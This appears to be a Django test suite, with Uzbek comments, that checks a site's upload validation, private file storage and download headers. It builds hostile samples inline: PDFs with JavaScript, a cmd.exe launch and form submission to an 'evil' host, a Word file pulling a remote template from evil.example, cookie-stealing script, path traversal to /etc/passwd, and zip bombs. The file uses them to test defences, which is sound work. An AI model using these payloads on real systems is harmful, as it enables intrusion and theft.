"""Fayl xavfsizligi testlari: yuklash (tekshiruv, tozalash), yopiq saqlash, yuklab olish sarlavhalari, hajm cheklovi.

Ishga tushirish:  python manage.py test apps.api.test_files
Hujum namunalari testning o'zida quriladi (tashqi fayl yoki dastur kerak emas).
"""
import io
import json
import os
import re
import shutil
import tempfile
import zipfile
import zlib
from pathlib import Path

from django.conf import settings
from django.core.cache import cache
from django.core.exceptions import ValidationError
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import Client, TestCase, override_settings
from PIL import Image

from apps.accounts.models import User
from apps.core import filesafe
from apps.core.filesafe import MAGIC, clean_upload
from apps.core.uploads import square_avatar
from apps.structure.models import Appeal, StaffDocument

HOST = {'HTTP_HOST': 'localhost'}
DOC_EXTS = {'.pdf', '.doc', '.docx', '.ppt', '.pptx', '.jpg', '.png'}


# ───────────── namunalar yasash ─────────────

def png(w=20, h=20, mode='RGB', color=(10, 120, 200)) -> bytes:
    out = io.BytesIO()
    Image.new(mode, (w, h), color if mode != 'L' else 7).save(out, format='PNG')
    return out.getvalue()


def jpeg_with_gps_and_payload() -> bytes:
    img = Image.new('RGB', (40, 30), (200, 10, 10))
    exif = Image.Exif()
    exif[0x010F] = 'EvilCam'                       # Make
    exif[0x8825] = {1: 'N', 2: (41.0, 18.0, 0.0), 3: 'E', 4: (69.0, 16.0, 0.0)}  # GPS
    out = io.BytesIO()
    img.save(out, format='JPEG', exif=exif)
    return out.getvalue() + b'<script>alert(1)</script>PK\x03\x04appended-zip'


def pdf(body: bytes = b'', extra_after_eof: bytes = b'') -> bytes:
    return (b'%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n'
            + body + b'trailer\n<< /Root 1 0 R >>\n%%EOF\n' + extra_after_eof)


def pdf_with_objstm(inner: bytes) -> bytes:
    comp = zlib.compress(inner)
    stream = b'4 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length %d >>\nstream\n' % len(comp) + comp + b'\nendstream\nendobj\n'
    return pdf(stream)


def ooxml(kind='docx', extra: dict | None = None, rels: dict | None = None, content_types: str | None = None) -> bytes:
    main = 'word/document.xml' if kind == 'docx' else 'ppt/presentation.xml'
    out = io.BytesIO()
    with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('[Content_Types].xml', content_types or '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')
        z.writestr(main, '<doc/>')
        for name, data in (extra or {}).items():
            z.writestr(name, data)
        for name, data in (rels or {}).items():
            z.writestr(name, data)
    return out.getvalue()


def ole(kind='doc', extra: str = '') -> bytes:
    marker = 'WordDocument' if kind == 'doc' else 'PowerPoint Document'
    return filesafe._OLE_MAGIC + b'\0' * 64 + marker.encode('utf-16-le') + extra.encode('utf-16-le') + b'\0' * 64


def upload(name: str, data: bytes) -> SimpleUploadedFile:
    return SimpleUploadedFile(name, data)


def rejected(test, name: str, data: bytes, exts=DOC_EXTS, max_bytes: int = 20 * 1024 * 1024):
    with test.assertRaises(ValidationError, msg=name):
        clean_upload(upload(name, data), exts, max_bytes)


# ───────────── tekshiruvlar ─────────────

class FileValidationTests(TestCase):
    def test_clean_files_pass_and_get_random_names(self):
        for name, data in (('a.pdf', pdf()), ('b.png', png()), ('c.docx', ooxml('docx')), ('d.pptx', ooxml('pptx')),
                           ('e.doc', ole('doc')), ('f.ppt', ole('ppt'))):
            f, ext = clean_upload(upload(name, data), DOC_EXTS, 20 * 1024 * 1024)
            self.assertRegex(f.name, r'^[0-9a-f]{32}\.[a-z]+$', name)
            self.assertNotEqual(f.name, name)
            self.assertEqual(ext, os.path.splitext(name)[1])

    def test_extension_and_magic_must_match(self):
        rejected(self, 'x.exe', b'MZ\x90\x00' + b'0' * 100)
        rejected(self, 'x.html', b'<html><script>1</script></html>')
        rejected(self, 'x.pdf', b'<html><script>alert(1)</script></html>')          # HTML, kengaytma pdf
        rejected(self, 'x.jpg', png())                                               # PNG tarkibi, jpg nomi
        rejected(self, 'x.png', b'\x89PNG\r\n\x1a\n' + b'garbage')                  # sarlavha bor, rasm emas
        rejected(self, 'x.docx', pdf())
        rejected(self, 'x.pdf.exe', pdf())
        rejected(self, 'noext', pdf())
        rejected(self, 'x.svg', b'<svg onload="alert(1)"/>', exts=DOC_EXTS | {'.svg'})

    def test_empty_and_oversize(self):
        rejected(self, 'x.pdf', b'')
        rejected(self, 'x.pdf', pdf(b'0' * 2000), max_bytes=1000)

    def test_every_allowed_ext_has_magic(self):
        self.assertTrue(DOC_EXTS <= set(MAGIC))


class ImageTests(TestCase):
    def test_reencode_strips_metadata_and_appended_payload(self):
        f, _ = clean_upload(upload('p.jpg', jpeg_with_gps_and_payload()), {'.jpg'}, 5 * 1024 * 1024)
        data = f.read()
        self.assertNotIn(b'<script>', data)
        self.assertNotIn(b'appended-zip', data)
        img = Image.open(io.BytesIO(data))
        self.assertEqual(img.format, 'JPEG')
        self.assertEqual(dict(img.getexif()), {})                                    # GPS/Make yo'q

    def test_pixel_bomb_rejected(self):
        big = png(8000, 6000, mode='L')                                              # ~48 Mpx, fayl kichik
        self.assertLess(len(big), 2 * 1024 * 1024)
        rejected(self, 'bomb.png', big, exts={'.png'})

    def test_avatar_is_webp_without_metadata(self):
        f = square_avatar(upload('me.jpg', jpeg_with_gps_and_payload()))
        img = Image.open(io.BytesIO(f.read()))
        self.assertEqual(img.format, 'WEBP')
        self.assertEqual(img.width, img.height)
        self.assertNotIn(b'<script>', f.read() if f.seekable() and not f.seek(0) else b'')

    def test_avatar_rejects_non_image_and_gif(self):
        for name, data in (('a.jpg', b'\xff\xd8\xff' + b'x' * 50), ('a.png', pdf())):
            with self.assertRaises(ValidationError):
                square_avatar(upload(name, data))
        gif = io.BytesIO()
        Image.new('P', (8, 8)).save(gif, format='GIF')
        with self.assertRaises(ValidationError):
            square_avatar(upload('a.gif', gif.getvalue()))


class PdfTests(TestCase):
    def test_active_content_rejected(self):
        evil = [
            ('js', pdf(b'3 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj\n')),
            ('hex-obfuscated', pdf(b'3 0 obj\n<< /S /J#61va#53cript /J#53 (x) >>\nendobj\n')),
            ('launch', pdf(b'3 0 obj\n<< /S /Launch /F (cmd.exe) >>\nendobj\n')),
            ('embedded', pdf(b'3 0 obj\n<< /Type /EmbeddedFile /Length 0 >>\nendobj\n')),
            ('submit', pdf(b'3 0 obj\n<< /S /SubmitForm /F (http://evil) >>\nendobj\n')),
            ('gotor', pdf(b'3 0 obj\n<< /S /GoToR /F (//evil/share/x.pdf) >>\nendobj\n')),
            ('objstm', pdf_with_objstm(b'<< /S /JavaScript /JS (app.alert(1)) >>')),
            ('encrypted', pdf(b'trailer\n<< /Encrypt 9 0 R >>\n')),
        ]
        for label, data in evil:
            rejected(self, f'{label}.pdf', data)

    def test_polyglot_after_eof_rejected(self):
        rejected(self, 'p.pdf', pdf(extra_after_eof=b'PK\x03\x04' + b'A' * 4096))
        rejected(self, 'short.pdf', pdf(extra_after_eof=b'<script>alert(1)</script>'))          # qisqa yuklama ham
        clean_upload(upload('ws.pdf', pdf(extra_after_eof=b'\r\n\n  \0')), {'.pdf'}, 1024 * 1024)  # bo'shliq — mumkin
        rejected(self, 'cut.pdf', b'%PDF-1.4\n1 0 obj\n<<>>\nendobj\n')               # %%EOF yo'q

    def test_binary_stream_noise_is_not_false_positive(self):
        # Rasm/siqilgan oqim ichida tasodifan `/JS ` baytlari uchrashi mumkin — bu rad etish sababi emas
        noise = b'\x00\x01/JS (x) /JavaScript /Launch \xff' * 50
        body = b'5 0 obj\n<< /Length %d /Filter /DCTDecode >>\nstream\n' % len(noise) + noise + b'\nendstream\nendobj\n'
        clean_upload(upload('ok.pdf', pdf(body)), {'.pdf'}, 20 * 1024 * 1024)

    def test_zlib_bomb_in_objstm_rejected(self):
        comp = zlib.compress(b'0' * (40 * 1024 * 1024))
        stream = b'4 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode >>\nstream\n' + comp + b'\nendstream\nendobj\n'
        rejected(self, 'bomb.pdf', pdf(stream))


class OfficeTests(TestCase):
    def test_macro_and_active_parts_rejected(self):
        bad = {
            'vba': ooxml(extra={'word/vbaProject.bin': b'x'}),
            'activex': ooxml(extra={'word/activeX/activeX1.xml': b'<a/>'}),
            'ole-embed': ooxml(extra={'word/embeddings/oleObject1.bin': b'x'}),
            'exe-inside': ooxml(extra={'word/media/payload.exe': b'MZ'}),
            'html-inside': ooxml(extra={'word/x.html': b'<script/>'}),
            'macro-ct': ooxml(content_types='<Types><Override ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>'),
            'traversal': ooxml(extra={'../../evil.txt': b'x'}),
            'abs-path': ooxml(extra={'/etc/cron.d/x': b'x'}),
            'external-template': ooxml(rels={'word/_rels/settings.xml.rels': (
                '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                'Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>')}),
            'external-image': ooxml(rels={'word/_rels/document.xml.rels': (
                '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
                'Target="http://tracker.example/p.png" TargetMode="External"/></Relationships>')}),
            'js-hyperlink': ooxml(rels={'word/_rels/document.xml.rels': (
                '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
                'Target="javascript:alert(1)" TargetMode="External"/></Relationships>')}),
            'missing-main': (lambda b: b)(self._zip({'[Content_Types].xml': '<Types/>', 'other.xml': '<a/>'})),
            'not-a-zip': b'PK\x03\x04' + b'not really a zip' * 10,
        }
        for label, data in bad.items():
            rejected(self, f'{label}.docx', data)

    @staticmethod
    def _zip(files: dict) -> bytes:
        out = io.BytesIO()
        with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
            for k, v in files.items():
                z.writestr(k, v)
        return out.getvalue()

    def test_legit_docx_features_pass(self):
        ok = ooxml(
            extra={'word/printerSettings/printerSettings1.bin': b'\0' * 16,               # oddiy hujjatlarda uchraydi
                   'word/embeddings/Microsoft_Excel_Sheet1.xlsx': b'PK'},                 # diagramma ma'lumoti
            rels={'word/_rels/document.xml.rels': (
                '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
                'Target="https://uzswlu.uz/page" TargetMode="External"/></Relationships>')})
        clean_upload(upload('ok.docx', ok), {'.docx'}, 20 * 1024 * 1024)

    def test_zip_bomb_rejected(self):
        out = io.BytesIO()
        with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
            z.writestr('[Content_Types].xml', '<Types/>')
            z.writestr('word/document.xml', '<doc/>')
            z.writestr('word/media/big.xml', b'0' * (8 * 1024 * 1024))                    # ~1:1000 nisbat
        rejected(self, 'bomb.docx', out.getvalue())

    def test_legacy_ole(self):
        clean_upload(upload('ok.doc', ole('doc')), {'.doc'}, 20 * 1024 * 1024)
        rejected(self, 'macro.doc', ole('doc', extra='_VBA_PROJECT'))
        rejected(self, 'macro2.doc', ole('doc', extra='Macros'))
        rejected(self, 'embed.ppt', ole('ppt', extra='ObjectPool'))
        rejected(self, 'encrypted.doc', ole('doc', extra='EncryptedPackage'))
        rejected(self, 'wrong-kind.doc', ole('ppt'))                                      # .doc deb nomlangan, ichida PowerPoint


# ───────────── endpointlar ─────────────

class EndpointBase(TestCase):
    def setUp(self):
        cache.clear()
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
        # Appeal.file yopiq saqlashi import paytida yaratilgan — sinovda vaqtinchalik papkaga yo'naltiramiz
        self.storage = Appeal._meta.get_field('file').storage
        self._old = self.storage._location
        self.storage._location = self.tmp
        for attr in ('base_location', 'location'):
            self.storage.__dict__.pop(attr, None)
        self.addCleanup(self._restore)
        mk = User.objects.create_user
        self.root = mk('root', password='Pw-12345678!', role='superadmin', name='Root')
        self.ed = mk('ed', password='Pw-12345678!', role='editor', name='Editor')

    def _restore(self):
        self.storage._location = self._old
        for attr in ('base_location', 'location'):
            self.storage.__dict__.pop(attr, None)

    def jwt(self, username):
        res = Client(**HOST).post('/api/cms/users/login', data=json.dumps({'username': username, 'password': 'Pw-12345678!'}),
                                  content_type='application/json')
        return {'HTTP_AUTHORIZATION': f"Bearer {res.json()['token']}", **HOST}

    @staticmethod
    def appeal_form(file=None, **over):
        d = {'name': 'Test Foydalanuvchi', 'phone': '+998901234567', 'email': 'a@b.uz', 'recipient': 'rector',
             'message': 'Murojaat matni kamida o‘n belgi', 'consent': 'yes'}
        d.update(over)
        if file:
            d['file'] = file
        return d


@override_settings(THROTTLE_APPEALS='1000/min')
class AppealUploadTests(EndpointBase):
    def post(self, form, **extra):
        return Client(**HOST).post('/api/appeals', form, **extra)

    def test_clean_pdf_is_stored_privately_with_random_name(self):
        with override_settings(PRIVATE_ROOT=self.tmp):
            res = self.post(self.appeal_form(upload('Pasport nusxasi (1).pdf', pdf())))
        self.assertEqual(res.status_code, 200, res.content)
        a = Appeal.objects.get()
        self.assertRegex(a.file.name, r'^appeals/\d{4}/\d{2}/[0-9a-f]{32}\.pdf$')
        self.assertTrue((Path(self.tmp) / a.file.name).is_file())
        self.assertFalse((Path(settings.MEDIA_ROOT) / a.file.name).exists())              # ochiq /media da emas

    def test_dangerous_files_rejected_and_not_saved(self):
        for name, data in (('x.pdf', pdf(b'3 0 obj\n<< /S /JavaScript /JS (1) >>\nendobj\n')), ('x.exe', b'MZ' + b'0' * 99),
                           ('x.docx', ooxml(extra={'word/vbaProject.bin': b'x'}))):
            res = self.post(self.appeal_form(upload(name, data), email=f'{name}@b.uz'))
            self.assertEqual(res.status_code, 422, name)
        self.assertEqual(Appeal.objects.count(), 0)
        self.assertEqual([p for p in Path(self.tmp).rglob('*') if p.is_file()], [])

    def test_request_size_limited_before_reading(self):
        res = self.post(self.appeal_form(upload('x.pdf', pdf())), CONTENT_LENGTH=str(13 * 1024 * 1024))
        self.assertEqual(res.status_code, 413)
        self.assertEqual(Appeal.objects.count(), 0)

    def test_multipart_without_length_rejected(self):
        res = self.post(self.appeal_form(upload('x.pdf', pdf())), CONTENT_LENGTH='')
        self.assertEqual(res.status_code, 411)


class PrivateDownloadTests(EndpointBase):
    def setUp(self):
        super().setUp()
        (Path(self.tmp) / 'appeals/2026/11').mkdir(parents=True)
        (Path(self.tmp) / 'appeals/2026/11/abc.pdf').write_bytes(pdf())
        (Path(self.tmp).parent / 'outside-secret.txt').write_text('secret')
        self.addCleanup(lambda: (Path(self.tmp).parent / 'outside-secret.txt').unlink(missing_ok=True))

    def get(self, name, headers=HOST):
        with override_settings(PRIVATE_ROOT=self.tmp):
            return Client().get(f'/api/cms/private/{name}', **headers)

    def test_anonymous_and_editor_denied_superadmin_allowed(self):
        self.assertEqual(self.get('appeals/2026/11/abc.pdf').status_code, 401)
        self.assertEqual(self.get('appeals/2026/11/abc.pdf', self.jwt('ed')).status_code, 403)
        res = self.get('appeals/2026/11/abc.pdf', self.jwt('root'))
        self.assertEqual(res.status_code, 200)
        self.assertIn('attachment', res['Content-Disposition'])
        self.assertEqual(res['Content-Type'], 'application/octet-stream')
        self.assertEqual(res['X-Content-Type-Options'], 'nosniff')
        self.assertIn('sandbox', res['Content-Security-Policy'])
        self.assertIn('no-store', res['Cache-Control'])

    def test_path_traversal_blocked(self):
        h = self.jwt('root')
        for name in ('../outside-secret.txt', '..%2foutside-secret.txt', 'appeals/../../outside-secret.txt', '%2e%2e/outside-secret.txt',
                     '/etc/passwd'):
            self.assertIn(self.get(name, h).status_code, (301, 400, 404), name)

    def test_private_files_not_served_from_public_media(self):
        res = Client(**HOST).get('/media/appeals/2026/11/abc.pdf')
        self.assertEqual(res.status_code, 404)


class MediaHeadersTests(TestCase):
    """`/media/` dan beriladigan fayllar: qat'iy Content-Type, nosniff, rasmda sandbox, noma'lum tur — yuklab olish."""

    def setUp(self):
        self.dir = Path(settings.MEDIA_ROOT) / '_filetests'
        self.dir.mkdir(parents=True, exist_ok=True)
        self.addCleanup(shutil.rmtree, self.dir, ignore_errors=True)
        (self.dir / 'evil.html').write_text('<script>alert(document.cookie)</script>')
        (self.dir / 'evil.svg').write_text('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>')
        (self.dir / 'a.webp').write_bytes(b'RIFF....WEBP')
        (self.dir / 'a.pdf').write_bytes(pdf())

    def get(self, name):
        return Client(**HOST).get(f'/media/_filetests/{name}')

    def test_html_and_svg_never_render(self):
        for name in ('evil.html', 'evil.svg'):
            res = self.get(name)
            self.assertEqual(res.status_code, 200)
            self.assertEqual(res['Content-Type'], 'application/octet-stream', name)
            self.assertTrue(res['Content-Disposition'].startswith('attachment; filename='), name)
            self.assertEqual(res['X-Content-Type-Options'], 'nosniff')

    def test_image_has_sandbox_csp_and_pdf_inline(self):
        res = self.get('a.webp')
        self.assertEqual(res['Content-Type'], 'image/webp')
        self.assertIn('sandbox', res['Content-Security-Policy'])
        self.assertNotIn('attachment', res.get('Content-Disposition', ''))
        res = self.get('a.pdf')
        self.assertEqual(res['Content-Type'], 'application/pdf')
        self.assertEqual(res['X-Content-Type-Options'], 'nosniff')

    def test_404_has_no_special_headers_and_traversal_blocked(self):
        self.assertEqual(self.get('nope.webp').status_code, 404)
        for url in ('/media/../manage.py', '/media/%2e%2e/manage.py', '/media/_filetests/../../manage.py'):
            self.assertIn(Client(**HOST).get(url).status_code, (400, 404), url)


class PanelMediaUploadTests(EndpointBase):
    def test_panel_media_rejects_active_pdf_svg_and_bmp(self):
        h = self.jwt('root')
        for name, data in (('a.pdf', pdf(b'3 0 obj\n<< /S /JavaScript /JS (1) >>\nendobj\n')),
                           ('a.svg', b'<svg onload="alert(1)"/>'), ('a.html', b'<script/>'), ('a.bmp', b'BM' + b'0' * 80)):
            res = Client().post('/api/cms/media', {'file': upload(name, data), '_payload': json.dumps({'folder': 'docs'})}, **h)
            self.assertEqual(res.status_code, 400, (name, res.content))

    def test_panel_media_accepts_clean_pdf_and_image_is_reencoded(self):
        h = self.jwt('root')
        res = Client().post('/api/cms/media', {'file': upload('a.pdf', pdf()), '_payload': json.dumps({'folder': 'docs'})}, **h)
        self.assertEqual(res.status_code, 201, res.content)
        res = Client().post('/api/cms/media', {'file': upload('x.jpg', jpeg_with_gps_and_payload()), '_payload': json.dumps({'folder': 'posts'})}, **h)
        self.assertEqual(res.status_code, 201, res.content)
        url = res.json()['doc']['url']
        self.assertTrue(url.endswith('.webp'))                                           # qayta kodlangan
        stored = Path(settings.MEDIA_ROOT) / url.split('/media/', 1)[1]
        self.addCleanup(lambda: shutil.rmtree(Path(settings.MEDIA_ROOT) / 'posts' / 'sizes', ignore_errors=True))
        data = stored.read_bytes()
        self.assertNotIn(b'<script>', data)
        self.assertEqual(dict(Image.open(io.BytesIO(data)).getexif()), {})
        self.addCleanup(lambda: stored.unlink(missing_ok=True))


class CabinetQuotaTests(TestCase):
    def test_per_user_quota(self):
        from apps.api import builders_staff as bst
        tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        data = {'title_uz': 'Hujjat'}
        with override_settings(MEDIA_ROOT=tmp), \
                self.settings(), \
                _patched(bst, DOC_QUOTA_COUNT=2):
            for _ in range(2):
                bst.add_document('777', 'cv', data, {'file': upload('cv.pdf', pdf())})
            with self.assertRaises(bst.Unprocessable):
                bst.add_document('777', 'cv', data, {'file': upload('cv.pdf', pdf())})
            bst.add_document('888', 'cv', data, {'file': upload('cv.pdf', pdf())})        # boshqa xodimga ta'sir qilmaydi
        self.assertEqual(StaffDocument.objects.filter(hemis_id='777').count(), 2)


class CabinetOwnershipTests(TestCase):
    """Hujjat identifikatori (pk) taxmin qilinsa ham, boshqa xodimning hujjatiga tegib bo'lmaydi (IDOR)."""

    def test_cannot_delete_other_users_document(self):
        from rest_framework.exceptions import NotFound

        from apps.api import builders_staff as bst
        tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        with override_settings(MEDIA_ROOT=tmp):
            bst.add_document('111', 'cv', {'title_uz': 'Mening'}, {'file': upload('cv.pdf', pdf())})
            doc = StaffDocument.objects.get(hemis_id='111')
            with self.assertRaises(NotFound):
                bst.delete_document('222', 'cv', str(doc.pk))          # boshqa xodim
            with self.assertRaises(NotFound):
                bst.delete_document('111', 'cv', 'abc')                # raqam bo'lmagan identifikator
            self.assertTrue(StaffDocument.objects.filter(pk=doc.pk).exists())
            bst.delete_document('111', 'cv', str(doc.pk))              # egasi o'chira oladi
        self.assertFalse(StaffDocument.objects.filter(pk=doc.pk).exists())


class _patched:
    def __init__(self, mod, **attrs):
        self.mod, self.attrs, self.old = mod, attrs, {}

    def __enter__(self):
        for k, v in self.attrs.items():
            self.old[k] = getattr(self.mod, k)
            setattr(self.mod, k, v)

    def __exit__(self, *exc):
        for k, v in self.old.items():
            setattr(self.mod, k, v)


class SourceHygieneTests(TestCase):
    def test_no_client_filename_used_for_storage(self):
        """Saqlash yo'llari mijoz nomidan emas, tasodifiy nomdan yasaladi."""
        from apps.structure.models import appeal_path, staff_doc_path
        self.assertRegex(appeal_path(None, '../../etc/passwd.PDF'), r'^appeals/\d{4}/\d{2}/[0-9a-f]{32}\.pdf$')
        self.assertNotIn('..', staff_doc_path(type('I', (), {'hemis_id': '1'})(), '../x.pdf'))
        self.assertTrue(re.fullmatch(r'[0-9a-f]{32}\.pdf', filesafe.random_name('.PDF')))
